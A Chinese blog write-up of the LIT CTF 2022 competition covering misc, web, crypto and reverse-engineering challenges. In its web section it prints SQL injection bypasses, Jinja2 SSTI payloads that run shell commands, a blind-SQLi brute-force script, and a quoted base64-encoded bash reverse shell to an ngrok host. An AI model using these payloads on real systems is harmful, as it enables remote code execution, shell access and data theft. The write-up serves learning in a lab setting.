---
title: LIT CTF 2022
date: 2022-07-25 12:36:29
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20220723214503970](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207232145029.png?x-oss-process=hzy)

Lexington Informatics Tournament CTF 2022

<!--more-->

---------------------------------------------

# 前言

这个比赛对于外国只是初高中生的CTF比赛，但是就这样的比赛，依然对我来说我只能说还是很难，misc的话前面七八个还好，后面就变得真misc了，web的话还是太菜，见得太少，就只能做上来前几个，crypto，pwn，re没咋接触过，就不说了，只是感觉国外的中学生CTF都这么高质量，真的是该加快进度学习了。最终在队友的带飞下，第七○|￣|_

![image-20220725142152394](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251421464.png?x-oss-process=hzy)

# misc

## **HelloWorld**

> Here's an easy CTF problem for demonstration purposes. I will go get some caesar salad while you solve this.

YVGPGS{J3yp0z3_G0_Y1GPGS}

## **Hex to ASCII**

> Do you know how to speak hexadecimal? I love speaking in hexadecimal. In fact, in HexadecimalLand, we like to say
> 4c49544354467b74306f6c355f346e645f77336273317433735f6172335f763372795f696d70307274346e745f6630725f4354467d

hex转str

LITCTF{t0ol5_4nd_w3bs1t3s_ar3_v3ry_imp0rt4nt_f0r_CTF}

## **Discord Flag**

LITCTF{L1T_1S_G0NNA_BE_S0_LIT_W1TH_Y0U_GUYS!}

## **PeanutButter.jar**

> We would like to say a huge thank you to Rythm and Eyangch for their massive support. Not only did they write many of the high quality problems, but they also helped us greatly in the process of hosting CTF. They are from the team **PeanutButter.jar** and are actually hosting their own CTF competition in August. If you haven't already, you should definitely check out their CTFTimes Profile, https://ctftime.org/team/78193.

LITCTF{H4s_Th3ir_0wn_CTF_OTZ_OTZ_OTZ}

## **Intro To LITCTF**

> Welcome to your first CTF Challenge! For this problem, you need to first read the [CTF Resource page](https://lit.lhsmathcs.org/ctfres) and find the first half of the flag :D. The second half of the flag can be found at our [Opening Ceremony](https://www.youtube.com/watch?v=5QCkheqOp3s&ab_channel=LexMACS)!

前半段是LITCTF{1_h0p3_y0u_didnt_s

后半段在视频中，是k1p_0ur_op3n1ng_c3r3mony}

所以flag是LITCTF{1_h0p3_y0u_didnt_sk1p_0ur_op3n1ng_c3r3mony}

## **CodeTiger orz Is Meta**

> can you find the flag from this amazing codetiger fan picture!!

附件是个图片，打开找到flag

![image-20220723005052139](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230050798.png?x-oss-process=hzy)

LITCTF{c0de_t1g2r_orz}

## **kirby!!!**

> Kirby is so cool! (Wrap your flag in LITCTF{})
>
> The beginning is very loud so you should turn down your volume.
>
> https://vocaroo.com/12wR27kejDYj
>
> 原曲：Kirby Mass Attack 的 Green Grounds

使用Adobe Audition进行音频分析得到flag

LITCTF{K1RBY1SCOOL!}

## **Geoguessr Normal Mode**

> I like the city! The flag is LITCTF{latitude,longtitude} rounded to the third decimal place. (Example: LITCTF{42.444,-71.230})

![image-20220723011355712](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230113950.png?x-oss-process=hzy)

找地方的取证题，最终坐标如下

![image-20220723011512590](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230115791.png?x-oss-process=hzy)

LITCTF{22.189,113.539}

# **web**

## **Personal Website**

> I am Esther Man, a brilliant student at Lexington High School. Welcome to my [personal website](http://litctf.live:31777/) <3 <3 <3

![image-20220723012157639](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230121860.png?x-oss-process=hzy)

看源码，得到三分之一的flag

![image-20220723012214911](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230122984.png?x-oss-process=hzy)

```
LITCTF{E5th3r_M4n
```

看js文件，得到后三分之一

![image-20220723012238286](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230122339.png?x-oss-process=hzy)

```
3v3ryth1ng_sh3_d03s}
```

css文件里找到中间的flag

![image-20220723013103936](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230131994.png?x-oss-process=hzy)

LITCTF{E5th3r_M4n_i5_s0_OTZ_0TZ_OFZ_4t_3v3ryth1ng_sh3_d03s}

## **Kevin's Cookies**

> Welcome to Kevin Zhu's [cookie store](http://litctf.live:31778/)! I heard he sells many super delicious cookies :yum:

![image-20220723013632734](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230136897.png?x-oss-process=hzy)

cookie有个属性，改成true

![image-20220723013657627](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230136699.png?x-oss-process=hzy)

![image-20220723013744855](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230137021.png?x-oss-process=hzy)

继续改cookie值，从1一个一个改，到17出flag

![image-20220723014006851](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207230140023.png?x-oss-process=hzy)LITCTF{Bd1mens10n_15_l1k3_sup3r_dup3r_0rzzzz}

## **Guess The Pokemon**

> Have you heard the new trending game? [GUESS THE POKEMON](http://litctf.live:31772/)!!! Please come try out our vast database of pokemons.

```
import sqlite3    //sqlite3中的单行注释绕过空格  --%0a
from flask import Flask, render_template, render_template_string, redirect, url_for, request

con = sqlite3.connect('data.db', check_same_thread=False)
app = Flask(__name__)

cur = con.cursor()
# comment
cur.execute('''DROP TABLE IF EXISTS pokemon''')
cur.execute('''CREATE TABLE pokemon (names text)''')
cur.execute(
    '''INSERT INTO pokemon (names) VALUES ("[FLAG REDACTED]") '''
)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':

        name = request.form['name']

        if ("'" in name or "\\" in name or '"' in name):    # 过滤规则  ' \\ ""
          return render_template('login.html', error="no quotes or backslashes:)")   # admin' and 1=1 #
        elif (name == "names"):
          return render_template('login.html', error="you are wrong :<")     # names
			
        try:
          cur.execute("SELECT * FROM pokemon WHERE names=" + name + "")
        except:
          render_template('login.html', error="you are wrong :3")
				
		
				
        rows = cur.fetchall()

        
        if len(rows) > 0:
            return render_template('login.html',
                                   error="Correct! The poekmon was " +
                                   rows[0][0])
        else:
            return render_template('login.html', error="you are wrong :<")

    return render_template('login.html', error="")
```

![image-20220723163457315](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231634409.png?x-oss-process=hzy)

发现有好多可以进入到login.html的途径，但是只有当name的值为names时存在漏洞，直接这样会返回you are wrong :<，绕过方法names--%0a

> %0a会被当作回车

![image-20220723163718946](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231637012.png?x-oss-process=hzy)

 LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}

## **Among Us**

> Hello! I am Polopopy, and my friends like to call me Ryan. I have an unhealthy fetichobsession with Among Us, so I made [this website](http://litctf.live:31779/) to demonstrate my unyielding enthusiasm!

![image-20220723145615775](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231456999.png?x-oss-process=hzy)

花里胡哨的，，抓包看报文头，响应包，得到flag

![image-20220723145727977](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231457081.png?x-oss-process=hzy)

LITCTF{mr_r4y_h4n_m4y_b3_su55y_bu7_4t_l3ast_h3s_OTZOTZOTZ}

> ps：刚开始抓包没看到，又是不认真，麻了麻了

## **CTF**

> Woah, [a Capture The Flag challenge](http://litctf.live:31780/), where players capture each other's flags, in a tournament called Capture The Flag? This is so original :O I do need a break from the standard web anyway I guess.

admin1  admin1

然后就出了，我这是站在巨人的肩膀上做的这题

![image-20220724215654837](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207242156956.png?x-oss-process=hzy)

其实代码里面写着呢

![image-20220724220621726](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207242206787.png?x-oss-process=hzy)

LITCTF{CTF_1n_a_CTF?_W0AH_TH1S_I5_l1k3_s0_cr34t1v3}

## **Flushed Emoji**

> Flushed emojis are so cool! Learn more about them [here](http://litctf.live:31781/)!

![image-20220724225703442](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207242257559.png?x-oss-process=hzy)

分析main.py，该网站在Flask上运行，模板引擎 Jinja2

![image-20220724230048115](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207242300235.png?x-oss-process=hzy)

password为可控变量，经测试也发现是存在ssti漏洞的

![image-20220724230150479](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207242301557.png?x-oss-process=hzy)

看源码不难发现有过滤规则，把点过滤了

![image-20220724230228346](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207242302451.png?x-oss-process=hzy)

```
curl -X POST 'http://litctf.live:31781/' -d "username=fuck&password={{request[\"__class__\"][\"__mro__\"][-1][\"__subclasses__\"]()[250]('ls',shell=True,stdout=-1)['communicate']()[0]}}" 
```

![image-20220725143312350](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251433426.png?x-oss-process=hzy)

但是这样并不能找到flag

```
username=admin&password={{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}
```

![image-20220725211552376](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252115464.png?x-oss-process=hzy)

因为过滤了点，所以采用HTML十六进制编码进行过滤

```
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat main\x2Epy')['read']()}}
```

![image-20220725211727883](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252117982.png?x-oss-process=hzy)

```
import requests;
import re;

app = Flask(__name__)


def alphanumericalOnly(str):
  return re.sub(r&#39;[^a-zA-Z0-9]&#39;, &#39;&#39;, str);

@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
  if request.method == &#39;POST&#39;:

    username = request.form[&#39;username&#39;]
    password = request.form[&#39;password&#39;]

  
    if(&#39;.&#39; in password):
      return render_template_string(&#34;lmao no way you have . in your password LOL&#34;);

    r = requests.post(&#39;http://172.24.0.8:8080/runquery&#39;, json={&#34;username&#34;: alphanumericalOnly(username),&#34;password&#34;: alphanumericalOnly(password)}); 
    print(r.text);
    if(r.text == &#34;True&#34;):
      return render_template_string(&#34;OMG you are like so good at guessing our flag I am lowkey jealoussss.&#34;);
    return render_template_string(&#34;ok thank you for your info i have now sold your password (&#34; + password + &#34;) for 2 donuts :)&#34;);

  return render_template(&#34;index.html&#34;);


@app.before_request
```

得到了他的真实ip：172.24.0.8:8080，可以通过RCE漏洞通过WEB应用程序重定向所有查询

先将盲sqli有效负载发送到数据库API，这里需要注意绕过过滤的符号----HTML编码`http://172.24.0.8:8080/runquery`

```
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('python3 -c \x27import requests; r = requests\x2Epost(\x22http://172\x2E24\x2E0\x2E8:8080/runquery\x22, json={\x22username\x22:\x22flag\x22,\x22password\x22:\x22a\\x27 or (SELECT hex(substr(password,1,1)) FROM users limit 1 offset 0) = hex(\\x27a\\x27)--\x22}); print(r\x2Etext)\x27')['read']()}}
```

![image-20220725212309947](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252123037.png?x-oss-process=hzy)

返回false，显然不行

我们知道flag是LITCTF{xxxxxx}，所以我们可以把a替换成L

```
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('python3 -c \x27import requests; r = requests\x2Epost(\x22http://172\x2E24\x2E0\x2E8:8080/runquery\x22, json={\x22username\x22:\x22flag\x22,\x22password\x22:\x22a\\x27 or (SELECT hex(substr(password,1,1)) FROM users limit 1 offset 0) = hex(\\x27L\\x27)--\x22}); print(r\x2Etext)\x27')['read']()}}
```

![image-20220725212632029](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252126129.png?x-oss-process=hzy)

返回true，然后就是迭代暴力破解flag

```
import requests
import sys
import string

url = 'http://litctf.live:31781/'

s = requests.Session()

flag = "LITCTF{"

i = 8 

while True: 
  for char in string.printable:
    charhex = r'\x' + format(ord(char), "x")
    
    r = s.post( url, data={"username": "a", "password": r"{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('python3 -c \x27import requests; r = requests\x2Epost(\x22http://172\x2E24\x2E0\x2E8:8080/runquery\x22, json={\x22username\x22:\x22flag\x22,\x22password\x22:\x22a\\x27 or (SELECT hex(substr(password," + str(i) + r",1)) FROM users limit 1 offset 0) = hex(\\x27" + charhex + r"\\x27)--\x22}); print(r\x2Etext)\x27')['read']()}}"} )
    
    if "False" in r.text:
      continue
    elif "True" in r.text:
      flag += char
      print(flag)
      i += 1 
      
      if char == '}': 
        sys.exit(1) 
        
      break
    else:
      print(r.text)
```

![image-20220725214126065](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252141155.png?x-oss-process=hzy)

LITCTF{flush3d_3m0ji_o.0}

比赛结束后我又看了其他人的wp，有不同的解法也学习一下

和我不一样的是对于点的过滤他是使用方括号进行绕过，并通过`_mro_`魔法函数来进行RCE

> __mro__返回一个包含类或对象所继承的基类元组。方法在解析式按照元组的顺序解析，从自身所属类到<class'object'>

最终的有效负载来从服务器获取RCE的paylaod

```
{{request[”__class__”][”__mro__”][-1][”__subclasses__”]()[250](‘<command>’,shell=True,stdout=-1)[‘communicate’]()[0]}}
```

但是只是这样可以发现遇到了同样的问题，那就是点没办法绕过，这个还是一样，但是他的绕过方式不一样，他是使用base64进行绕过

```
curl -X POST 'http://litctf.live:31781/' -d "username=fuck&password={{request[\"__class__\"][\"__mro__\"][-1][\"__subclasses__\"]()[250]('ls',shell=True,stdout=-1)['communicate']()[0]}}" 

curl -X POST 'http://litctf.live:31781/' -d "username=mrc4t&password={{request[\"__class__\"][\"__mro__\"][-1][\"__subclasses__\"]()[250]('echo%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvNC50Y3Aubmdyb2suaW8vMTk0NzYgPCYxJwo%3D%20%7C%20base64%20-d%20%7C%20bash',shell=True,stdout=-1)['communicate']()[0]}}"
//echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvNC50Y3Aubmdyb2suaW8vMTk0NzYgPCYxJwo= | base64 -d | bash
//echo bash -c 'exec bash -i &>/dev/tcp/4.tcp.ngrok.io/19476 <&1'  | base64 -d | bash
```

![image-20220726235247890](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207262352548.png?x-oss-process=hzy)

的确收到了shell，但是他是只读权限，并且连接不持久，总是中断

主要到了数据服务器IP地址是172.24.0.8:8080,这里有sql语句，password是可控变量，他是基于布尔值的sql注入

![image-20220727000339023](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207270003108.png?x-oss-process=hzy)

所以总体思路就是从服务器源获得本地ip地址

一个基于时间的简单的脚本

```
import requests
import string
def blindSqli(my_query,url):
    extracted_data = "LITCTF{"
    for index in range(len(extracted_data)+1,10000):
        for i in "_"+string.printable[:-5]:
            query = f"' or substr(({my_query}),{index},1)=\"{i}\" -- -" # payload for Sqlite boolean based
            print(f"[+] Trying {i}")
            try:
                r = requests.post(url, json={"username":"flag", "password":query})
                if "True" in r.text:
                    extracted_data+=i
                    if extracted_data[-1] == "}":
                        return extracted_data
                   
                    print(f"[!] Found {i}")
                    print(f"[+] {extracted_data}")
                    break
            except KeyboardInterrupt:
                quit()
            except:
                continue
def main():
    my_query = "select password from users where username='flag'"
    url = "http://172.24.0.8:8080/runquery"
    result = blindSqli(my_query,url)
    print(f'[+] Here is your flag: {result}')
if __name__ == "__main__":
    main()
```

进行加密传进去(想法是通过python3运行)

```
curl -X POST 'http://litctf.live:31781/' -d "username=mrc4t&password={{request[\"__class__\"][\"__mro__\"][-1][\"__subclasses__\"]()[250]('echo aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdHJpbmcKCmRlZiBibGluZFNxbGkobXlfcXVlcnksdXJsKToKICAgIGV4dHJhY3RlZF9kYXRhID0gIkxJVENURnsiCiAgICBmb3IgaW5kZXggaW4gcmFuZ2UobGVuKGV4dHJhY3RlZF9kYXRhKSsxLDEwMDAwKToKICAgICAgICBmb3IgaSBpbiAiXyIrc3RyaW5nLnByaW50YWJsZVs6LTVdOgogICAgICAgICAgICBxdWVyeSA9IGYiJyBvciBzdWJzdHIoKHtteV9xdWVyeX0pLHtpbmRleH0sMSk9XCJ7aX1cIiAtLSAtIiAjIHBheWxvYWQgZm9yIFNxbGl0ZSBib29sZWFuIGJhc2VkCiAgICAgICAgICAgIHByaW50KGYiWytdIFRyeWluZyB7aX0iKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249eyJ1c2VybmFtZSI6ImZsYWciLCAicGFzc3dvcmQiOnF1ZXJ5fSkKICAgICAgICAgICAgICAgIGlmICJUcnVlIiBpbiByLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgZXh0cmFjdGVkX2RhdGErPWkKICAgICAgICAgICAgICAgICAgICBpZiBleHRyYWN0ZWRfZGF0YVstMV0gPT0gIn0iOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZXh0cmFjdGVkX2RhdGEKICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHByaW50KGYiWyFdIEZvdW5kIHtpfSIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJbK10ge2V4dHJhY3RlZF9kYXRhfSIpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVsaWYgIkZhbHNlIiBpbiByLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgICAgICAgICAgcXVpdCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgpkZWYgbWFpbigpOgogICAgbXlfcXVlcnkgPSAic2VsZWN0IHBhc3N3b3JkIGZyb20gdXNlcnMgd2hlcmUgdXNlcm5hbWU9J2ZsYWcnIgogICAgdXJsID0gImh0dHA6Ly8xNzIuMjQuMC44OjgwODAvcnVucXVlcnkiCiAgICByZXN1bHQgPSBibGluZFNxbGkobXlfcXVlcnksdXJsKQogICAgcHJpbnQoZidbK10gSGVyZSBpcyB5b3VyIGZsYWc6IHtyZXN1bHR9JykKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkKCg== | base64 -d | python3',shell=True,stdout=-1)['communicate']()[0]}}"
```

成功复现，这个我着实惊讶，直接把脚本base加密之后这样传进去，然后执行

![image-20220726235853162](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207262358265.png?x-oss-process=hzy)

## **Amy The Hedgehog**

> Hi guys! I just learned sqlite3 build my own websiteeee. Come visit my [my website](http://litctf.live:31770/) pleaseeee i am ami the dhedghog!!! :3 ( ◡‿◡ *)

![image-20220725101201053](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251012021.png?x-oss-process=hzy)

sql注入漏洞（Flask）

```
1' or 1=1 -- -
```

![image-20220725101447558](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251014651.png?x-oss-process=hzy)



LITCTF{sldjf}

## **EYANGCH Fan Art Maker**

> I am biggest fan of Eyang OTZ OTZ OTZ, which is why I built this [EYANGCH Fan Art Maker](http://litctf.live:31775/)

![image-20220725102039254](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251020466.png?x-oss-process=hzy)

![image-20220725102101162](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251021307.png?x-oss-process=hzy)

submit后会出现一张图片，被遮盖了的flag

![image-20220725102142608](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251021763.png?x-oss-process=hzy)

这题没怎么接触过这种标签，没解出来，这是别人的非预期解

```
<component name="EYANGOTZ"></component>
```

![image-20220725121503736](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207251215872.png?x-oss-process=hzy)

LITCTF{wh4t_d03s_CH_1n_eyangCH_m3an???}

预期解是这样的

![image-20220725222206533](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252222604.png?x-oss-process=hzy)

在这里可以看到flag在绘制，只是最后被后面的其他绘制遮挡了

![image-20220725222303487](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252223567.png?x-oss-process=hzy)

```
<flag x="100" y="400"></flag>
```

所以我们可以模仿他的这个标签再写一个

```
<flag x="1" y="4"></flag>
```

![image-20220725222551716](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252225813.png?x-oss-process=hzy)

发现没发现没，反正我发现了，只是坐标不对，再调一下

```
<flag x="10" y="40"></flag>
```

![image-20220725222635724](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252226801.png?x-oss-process=hzy)

## **EYANGCH Fan Art Maker 2.0**

> Unfortunately the last Fan Art maker had an unintended extremely easy solution. Frankly I am disappointed by people's willingness to take the easy route when it comes to ORZing Eyang. To make up for it, here is more [EYANG OTZ OTZ OTZ](http://litctf.live:45392/)

![image-20220727001037412](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207270010601.png?x-oss-process=hzy)

界面还是一样，只是代码不一样了

测试example

```
<component name="ILoveEyangCH">
    <component name="Heart" x="10" y="10">
        <shape color="red">
            <point x="0" y="30"></point>
            <point x="30" y="0"></point>
            <point x="60" y="30"></point>
            <point x="90" y="0"></point>
            <point x="120" y="30"></point>
            <point x="60" y="90"></point>
        </shape>
    </component>
    <text x="0" y="300" font="bold 30pt Arial">EYANG OTZ OTZ OTZ!!!</text>    
</component>
<ILoveEyangCH x="50" y="50"></ILoveEyangCH>
<ILoveEyangCH x="130" y="100"></ILoveEyangCH>
<ILoveEyangCH x="210" y="150"></ILoveEyangCH>
```

![image-20220727001316784](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207270013895.png?x-oss-process=hzy)

初步分析之后可以发现这个payload

```
<component name="EYANGOTZ">
    <component name="eyes1">
    
    </component>
    <component name="eyes2">
        
    </component>
    <component name="mouth">
    
    </component>
</component>
//  component标签下最开始是EYANGOTZ，也就是所谓的flag地方，但是里面嵌套了一些蓝色条条，也就是看到的那些遮挡物

```

所以尝试直接删除嵌套，看看会不会出来

```
<component name="EYANGOTZ"> </component>
```

![image-20220727001422095](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207270014209.png?x-oss-process=hzy)

LTLCTF{3y4ngCH_15_l1k3_iu5t_s0_g3n10sit4}

# **crypto**

## Running Up That Hill

> If I only could, I'd make a deal with god, and I'd get him to swap our places.

```
ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}

5 19 27
10 19 24
11 6 16

A8FC7A{H7_ZODCEND_8F_CCQV_RTTVHD}
```

hill解密，只是需要自定义字母表，国内解密网站我都找烂了，硬是没找到，贴个国外的解密网站吧

https://www.dcode.fr/chiffre-hill

![image-20220723144923801](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207231449882.png?x-oss-process=hzy)



LITCTF{B3_RUNN1NG_UP_TH4T_H1LLLL}

## **Flashy Colors**

> Computer pixels are so interesting. Do you know that they are actually made of three lights? It's like each pixel has 3 tiny light switches, red, green, and blue, that can go on or off to create so many different colors.

这题队友做的，放个脚本学习一下

附件是个图片

![image-20220724095128176](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207240951366.png?x-oss-process=hzy)

```
from PIL import Image
img = Image.open('FlashyColors.png')
size = w, h = img.size
data = img.load()
flag = ''
for x in range(120,w,240):
    for y in range(120,h,240):
        color = data[x,y][:3]
        for c in color:
            if c == 0:
                flag += '0'
            else:
                flag += '1'
print(flag) //000001001100010010010101010001000011010101000100011001111011001100000100110101000111010111110100100101011111011011000011000001110110011001010101111101110100011010000011001101110011001100110101111101100110011011000110000100110101011010000111100101011111011000110011000001101100011011110111001001111101
```

binary to char

```
from Crypto.Util.number import long_to_bytes
s="000001001100010010010101010001000011010101000100011001111011001100000100110101000111010111110100100101011111011011000011000001110110011001010101111101110100011010000011001101110011001100110101111101100110011011000110000100110101011010000111100101011111011000110011000001101100011011110111001001111101"
print(long_to_bytes(int(s,2)))
```

![image-20220724095354177](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207240953263.png?x-oss-process=hzy)

```
LITCTF{0MG_I_l0ve_th3s3_fla5hy_c0lor}
```

# rev

## math test

> this math test is hard

64位文件，main函数分析
![image-20220725205532088](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252055164.png?x-oss-process=hzy)

跟进NUM_Q，发现是循环十次

![image-20220725205609383](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252056439.png?x-oss-process=hzy)

```
__isoc99_scanf("%llu", &submitted[i]);
//  输入函数
```

跟进grade_test()

![image-20220725205724889](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252057967.png?x-oss-process=hzy)

此处的for循环时是对输入的答案进行校验看是否正确

正确就会输出flag

继续跟进generate_flag()

![image-20220725205831528](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252058602.png?x-oss-process=hzy)

```
  for ( k = 0; k < FLAG_LEN; ++k )
    printf("%c", flag[k]);  
     // flag输出，跟进FLAG_LEN
```

得到问题答案

![image-20220725205958263](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252059322.png?x-oss-process=hzy)

这道题最直接的办法就是直接运行文件输入正确的答案得到flag

直接运行math这个文件是没有权限的，需要赋予777权限

```
chmod 777 math
./math
```

![image-20220725210152746](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207252101826.png?x-oss-process=hzy)

LITCTF{y0u_must_b3_gr8_@_m4th_i_th0ught_th4t_t3st_was_imp0ss1bl3!}